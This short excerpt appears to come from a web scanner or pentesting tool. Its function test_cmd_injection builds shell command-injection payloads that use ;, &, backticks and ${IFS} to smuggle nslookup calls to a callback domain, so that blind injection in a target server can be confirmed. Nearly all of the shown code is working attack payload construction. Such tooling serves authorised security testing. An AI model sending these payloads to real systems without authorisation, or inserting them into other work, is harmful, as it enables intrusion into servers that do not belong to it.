...
def test_cmd_injection(url, post):
    ...
    if(args.callback):
        cmdList.append("1;nslookup${IFS}"+randomVal[0]+"."+args.callback+";%23${IFS}';nslookup${IFS}"+randomVal[1]+"."+args.callback+";%23${IFS}\";nslookup${IFS}"+randomVal[2]+"."+args.callback+";%23${IFS}")
        cmdList.append("1%26nslookup "+randomVal[3]+"."+args.callback+"%26`nslookup "+randomVal[4]+"."+args.callback+"`%26\"1%26nslookup "+randomVal[5]+"."+args.callback+"%26`nslookup "+randomVal[6]+"."+args.callback+"`%26".format(randomVal[3], randomVal[4], randomVal[5]))
